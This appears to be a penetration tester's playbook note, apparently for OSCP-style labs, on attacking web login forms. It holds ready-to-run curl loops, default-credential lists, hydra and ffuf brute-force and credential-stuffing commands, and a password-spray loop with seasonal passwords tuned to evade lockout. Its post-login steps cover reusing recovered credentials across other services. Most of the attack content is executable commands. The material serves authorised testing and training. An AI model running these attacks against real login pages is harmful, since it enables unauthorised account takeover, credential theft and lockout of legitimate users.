
Credential-based attacks against discovered login forms. Entry from [[Web Attack Checksheet]] sub-block 1.6 on login-form observation (fires Sections 1-4) and sub-block 1.14 on populated `users_<host>.txt` (fires Section 5).

Ordering: default creds first (30-sec cost, high P on OSCP+); credential stuffing next (if external pair list); hit-and-hope brute force with common usernames (no enum required); password spray (one password × many users, evades lockout); enum-fed brute force last (requires target-enumerated usernames from [[Username Enumeration]]). Pre-flight checks cross-cut all sections — run once before Section 1.

---

## Pre-flight checks

Run once before proceeding. Determines whether shell path is viable (this note/playbook) or the operator must route to Burp `[[Burp Credential Attacks]]`. Stop at first sub-block that routes out — subsequent sections (Rate limiting profile, SUCCESS/FAIL oracle, Sections 1-5) apply only to the shell path.

⚠️ `[[Burp Credential Attacks]]` playbook body — build-when-encountered. CSRF and cookies-matter routes below dispatch here. Points to include: (1) Setup — Burp session-handling chain: [[Testing Replayability in Burp]] (confirm fresh state needed) → [[Fresh State Per Attempt]] (identify which fields to refresh — CSRF token / session cookie / hidden field / combination) → [[Automating Fresh State in Burp]] (implement macro + session handling rule); (2) Attack modes per section — Sniper (§1 default creds), Pitchfork (§2 credential stuffing), Cluster Bomb (§3 hit-and-hope, §4 spray, §5 enum-fed); (3) Payload sets — same wordlists as CA §1-5 (`~/scripts/wordlists/default_creds.txt`, `xato-net-10-million-usernames-top1M`, `rockyou.txt`, `users_<host>.txt`); (4) Oracle by app class — content/redirect: Intruder Grep-Match on `<login_form_marker>` presence (fail) / absence (success) after Follow Redirects enabled; api: response filter on HTTP 200; (5) Rate-limit tuning — Pre-flight rate-limit probe does not run on the Burp path; derive independently via Repeater rapid-send or Intruder low-thread test, set Resource Pool request delay accordingly; (6) Build trigger — first real-target encounter where CSRF or cookies-matter Pre-flight routes here.

### CSRF token detection

`curl -s http://<host>:<port>/<login_path> | grep -oiE 'name=["'"'"']?(_?csrf|authenticity_token|__requestverificationtoken)[^>]*' || echo "NO_CSRF_TOKEN"`

Route on output:

- Token field name printed → CSRF protection present. Shell tooling (Hydra/ffuf/curl-loop) cannot handle per-request tokens → route to `[[Burp Credential Attacks]]` (see ⚠️ above); skip remaining Pre-flight sub-blocks.
- `NO_CSRF_TOKEN` → proceed to cookies-matter check.

### Cookies-matter check

Test whether the login POST requires session cookies to be accepted at all. Shell tooling (Hydra/ffuf/curl loops + `auth_oracle_probe.sh`) sends POST requests with no cookies attached — if the app requires them, every attempt returns a session-error response (403 "session required", 200 with "please reload page", etc.) that the oracle probe would misclassify. Catches both stable-cookie apps (Type B) and cookie-rotated-per-use apps (Type C); both route to Burp.

⚠️ Substitute captured vars before pasting.

```bash
CJ=$(mktemp); curl -sk -c "$CJ" "http://<host>:<port>/<login_path>" -o /dev/null; S1=$(curl -sk -b "$CJ" -X POST -o /dev/null -w '%{http_code}:%{size_download}' --data-urlencode "<login_username_field>=xyzabc123xxx@invalid.test" --data-urlencode "<login_password_field>=wrong_ZZZ_9999" "http://<host>:<port>/<login_form_action>"); S2=$(curl -sk -X POST -o /dev/null -w '%{http_code}:%{size_download}' --data-urlencode "<login_username_field>=xyzabc123xxx@invalid.test" --data-urlencode "<login_password_field>=wrong_ZZZ_9999" "http://<host>:<port>/<login_form_action>"); rm -f "$CJ"; echo "with_cookies=$S1 without_cookies=$S2"
```

Route on output:

- `with_cookies == without_cookies` (same status AND same size) → cookies do not affect login POST. Proceed to rate-limit probe.
- `with_cookies != without_cookies` (status differs OR size differs) → login POST behaves differently with vs without cookies → cookies matter → route to `[[Burp Credential Attacks]]` (see ⚠️ above); skip remaining Pre-flight sub-blocks.

Limitation: check compares status+size only. Body-diff was considered but rejected — apps with rendered timestamps / request UUIDs / debug markers produce byte-differing bodies with identical size, false-positiving into Burp. Rare false-negative case (cookies matter but response has same status AND same size AND only body-text differs) surfaces later as Section 1-5 zero-hits → escalate to Burp then.

---

## Rate limiting profile

Establishes throttling posture. Tunes `<threads>` and `--delay` for Sections 1-5 and the SUCCESS/FAIL oracle probe (next section).

⚠️ Substitute captured vars before pasting (e.g. `<login_username_field>`).

```bash
for i in $(seq 1 10); do curl -sX POST -o /dev/null -w '[%{http_code}][size:%{size_download}][time:%{time_total}s]\n' -d '<login_username_field>=xyzabc123xxx&<login_password_field>=wrong' http://<host>:<port>/<login_form_action>; done
```

Route on output:

- Any HTTP 429 → hard rate limit. `<threads>` = 1 for all attacks; add `-W <delay>` (Hydra) between requests. Pass `--delay=<ms>` (500+) to `auth_oracle_probe.sh` in the SUCCESS/FAIL oracle section below.
- Response `time_total` grows across requests → soft throttle. `<threads>` = 1; pass `--delay=<ms>` to `auth_oracle_probe.sh`.
- Response `size` changes at request N → possible lockout at threshold N. Keep any single-username attack under N/2 attempts. Password spray (Section 4) unaffected.
- No changes across all 10 → no lockout observed. `<threads>` = 10 (ffuf) or 4 (Hydra) safe. No `--delay` needed on `auth_oracle_probe.sh`.

Save `<threads>` value for Sections 2-5 and any `--delay=<ms>` for the SUCCESS/FAIL oracle probe.

---

## SUCCESS/FAIL oracle

Derives per-tool oracle strings for Sections 1-5. Replaces the older `<fail_signal>` grep-string approach (which false-SUCCESSed on any anomalous response — 500, 429, empty-field validation, CAPTCHA).

**Run:**

`~/scripts/auth_oracle_probe.sh --host=<host> --port=<port> --login-path=<login_path> --form-action=<login_form_action> --user-field=<login_username_field> --pass-field=<login_password_field> [--delay=<ms>] [--scheme=<http|https>]`

Set `--delay=<ms>` from Pre-flight rate-limit probe if throttling detected. Add `--scheme=https` for TLS targets. Full marker contract in [[Scripts Index]].

**Route on emitted markers:**

- `CLASS: content|redirect|api` + `ORACLE_SUMMARY: class=<c> confidence=<c>` present → shell path OK; capture oracle vars below and proceed to Section 1.
- `CLASS: basic` + `ROUTE_OUT: Login Bypass Techniques Basic Auth section` → leave Credential Attacks; walk [[Login Bypass Techniques]] Basic Auth section.
- `BAIL: <reason>` (unusual fail status, curl failure, unclassifiable) → escalate to `[[Burp Credential Attacks]]` (see ⚠️ Pre-flight above).
- `RATE_LIMITED: sample=<name> <detail>` → target throttled mid-sampling; re-run with higher `--delay`.

**Capture emitted values (substitute textually into Sections 1-5 commands below):**

- `<oracle_hydra>` = value from `ORACLE_HYDRA:` line (e.g. `F=name="email"`, `S="token"`)
- `<oracle_ffuf>` = value from `ORACLE_FFUF:` line (e.g. `-mc 301,302,303,307,308`, `-r -fr 'name="user"'`, `-mc 200`)
- `<oracle_curl_success_test>` = value from `ORACLE_CURL_SUCCESS_TEST:` line (bash test expression; vault sections use bash)

For content class, also note the emitted `UNAUTH_MARKER:` and `FAIL_SIGNAL_CANDIDATE:` lines — alternative markers for manual pivot if primary oracle underperforms.

---

## 1. Default credentials

Fastest highest-EV attempt. 30 seconds via automated loop.

**Universal pairs (loop):**

```bash
URL="http://<host>:<port>/<login_form_action>"
while IFS=: read -r U P; do
  if <oracle_curl_success_test>; then echo "SUCCESS $U:$P"; fi
done << 'EOF'
admin:admin
admin:password
admin:
root:root
root:toor
root:password
admin:admin123
administrator:administrator
administrator:password
test:test
guest:guest
user:user
EOF
```


Only SUCCESS lines print (silent on fail). Any `SUCCESS` line → verify manually against target → Section 6.

**Framework-specific (if framework identified via WAC 1.1-1.4).** Add to the loop above:

- WordPress → `admin:admin`, `admin:password`, `wpadmin:wpadmin`
- Tomcat manager → `tomcat:tomcat`, `tomcat:s3cret`, `admin:tomcat`, `role1:role1`
- PHPMyAdmin → `root:`, `root:root`, `root:password`
- Jenkins → `admin:admin`, `admin:password`
- Grafana → `admin:admin`
- Joomla → `admin:admin`, `admin:password`
- Drupal → `admin:admin`
- Splunk → `admin:changeme`

Route:

- Any `SUCCESS` line → verify manually → Section 6
- No output → all default creds failed → 2

---

## 2. Credential stuffing

Try known/plausibly-leaked username:password pairs (from GitHub search, HIBP, engagement scope, prior foothold on adjacent service).

Precondition: pair list available.

Precondition unmet (no pair list at all) → 3.

**Prep pair list.** Common leak format is `<username>:<password>` per line. Split into aligned files:

```bash
cut -d: -f1 pairs.txt > users.txt
cut -d: -f2- pairs.txt > passwords.txt
```

**ffuf pitchfork (aligned pairs, one attack per row):**

`ffuf -w users.txt:U -w passwords.txt:P -mode pitchfork -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_stuff_<host>_<port>.json -of json`

Route:

- Any ffuf result entry → verify manually → Section 6
- ffuf found no matches → 3

---

## 3. Hit-and-hope brute force

Common usernames × common passwords. No target-specific enumeration required. Highest EV among "try before enumeration" attacks — usernames like `admin`, `administrator`, `root` frequently exist on OSCP+ boxes.

Precondition: `<threads>` established from Pre-flight lockout probe. If lockout risk high, skip to Section 4 (password spray evades per-user lockout).

**Hydra with common user/password shortlists:**

`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -e nsr <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:<oracle_hydra>' -t <threads> -o hydra_hitand_<host>_<port>.txt -V`

`-e nsr` also tries: empty password, same-as-user, reversed-user.

**ffuf cluster bomb variant:**

`ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:P -mode clusterbomb -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_hitand_<host>_<port>.json -of json`

Route:

- Hydra prints `[<port>][http-post-form] host: <host>   login: <user>   password: <pass>` line, OR ffuf shows any result entry → verify manually → Section 6
- Exhausted, no success → 4

---

## 4. Password spray

One common password against many users. Evades per-user account lockout (each user gets exactly one attempt). Effective against organisations with weak default password policies.

Precondition: username candidate list — use `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` if `users_<host>.txt` empty, use both concatenated if populated.

**Spray common passwords one at a time:**

```bash
for p in "Password1" "Password123" "Welcome1" "Winter2025!" "Summer2025!" "Autumn2025!" "Spring2025!" "Company123" "changeme"; do
  echo "=== spraying: $p ==="
	hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p "$p" <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:<oracle_hydra>' -t <threads> -o "hydra_spray_${p}.txt" -V 2>/dev/null | grep -i 'login:'
done
```

Adjust seasonal passwords to current year. Add company-name variants if known (e.g. `<company>123`, `<company>2025`).

Route:

- Any spray line prints `login: <user>` → verify manually → Section 6
- All sprays return no hits → 5 (if `users_<host>.txt` populated) OR exhausted (if empty)

---

## 5. Enum-fed brute force

Full password wordlist × target-enumerated usernames. Fires from WAC sub-block 1.14 when `users_<host>.txt` is populated by [[Username Enumeration]] or IDOR.

Precondition: `users_<host>.txt` contains one or more entries. If empty → this section does not fire.

**Hydra with enumerated user list:**

`hydra -L users_<host>.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -e nsr <host> http-post-form '/<login_form_action>:<login_username_field>=^USER^&<login_password_field>=^PASS^:<oracle_hydra>' -t <threads> -o hydra_enum_<host>_<port>.txt -V`

**ffuf cluster bomb variant:**

`ffuf -w users_<host>.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:P -mode clusterbomb -X POST -d '<login_username_field>=U&<login_password_field>=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> <oracle_ffuf> -t <threads> -o ffuf_enum_<host>_<port>.json -of json`

**Target-derived wordlist (Cewl).** If common wordlists exhaust with no hit, generate target-specific wordlist:

`cewl -d 2 -m 5 -w cewl_<host>.txt http://<host>:<port>/`

Re-run Hydra/ffuf above with `-P cewl_<host>.txt`.

Route:

- Success line printed → verify manually → Section 6
- All combinations exhausted → return to [[Web Attack Checksheet]] sub-block after 1.14

---

## 6. Post-success routing

On verified successful login (recovered `<user>:<pass>`):

1. Log to `route_<ip>.txt`:

    `printf '[Credential Attacks] APPLIED: creds recovered <user>:<pass> on <host>:<port><login_path>\n' >> route_<ip>.txt`

2. Save to `creds_<host>.txt` for cross-service reuse:

    `echo '<user>:<pass>' >> creds_<host>.txt`

3. Capture session cookie from successful response:

	`curl -sX POST -i -d '<login_username_field>=<user>&<login_password_field>=<pass>' http://<host>:<port>/<login_form_action> | grep -i '^Set-Cookie:'`

4. Route by post-login surface:

- Session cookie set (opaque OR JWT-shaped) → use in `Cookie:` header for authenticated requests; re-walk [[Web Attack Checksheet]] sub-blocks 1.6-1.13 authenticated (often reveals admin surface / additional routes invisible unauth)
- JWT-shaped cookie (three base64 segments dot-separated) → also consider [[Session Cookie Attacks]] (JWT branch) for privilege escalation via token forge
- Admin surface reached with RCE-viable feature (plugin/theme upload, arbitrary file upload, command exec panel) → [[File Upload]] or relevant WAC technique
- Direct RCE / shell obtained via authenticated feature → escalate to [[Linux Privilege Escalation Checksheet]] / [[Windows Privilege Escalation Checksheet]]
- Same credentials work against other services on target (SSH, database, RDP) → try laterally per [[MASTER WORKFLOW/Step 6. Vulnerability Analysis]] Pass 2/3 per-service workflows

---

## Exhaustion

Sections 1-5 all exhausted without foothold:

- If entered from WAC 1.5 → continue Step 1 walking (1.7 register form, then 1.8 forgot-password, etc.)
- If entered from WAC 1.14 → return to [[Web Attack Checksheet]] Step 5 (deferred low-EV sweep)
